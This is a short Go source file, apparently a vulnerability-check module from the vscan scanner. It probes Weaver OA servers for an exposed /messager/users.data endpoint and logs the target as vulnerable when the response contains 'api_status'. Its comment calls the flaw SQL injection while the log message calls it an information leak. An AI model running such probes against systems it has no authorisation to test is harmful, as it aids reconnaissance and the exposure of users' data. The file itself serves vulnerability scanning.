package weaver

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

// UsersData SQL注入漏洞

func UsersData(u string) bool {
	if req, err := pkg.HttpRequset(u+"/messager/users.data", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "api_status"){
			pkg.GoPocLog(fmt.Sprintf("Found vuln weaver UsersData 信息泄露|%s\n", u+"/messager/users.data"))

			return true
		}
	}
	return false
}